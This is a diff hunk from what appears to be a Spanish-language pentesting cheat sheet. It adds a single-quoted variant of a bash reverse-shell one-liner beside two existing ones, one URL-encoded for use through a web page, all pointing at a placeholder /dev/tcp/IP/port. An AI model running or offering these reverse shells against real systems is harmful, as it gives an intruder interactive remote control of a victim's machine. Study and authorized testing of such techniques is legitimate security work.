@@ -1300,6 +1300,10 @@ Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia e
 bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
 bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 
+	# Si los de arriba no funcionan intenta con las comillas simples.
+
+bash -c 'bash -i >& /dev/tcp/IP/port 0>&1'
+
 ```
 ***ASP*** simple shell
 
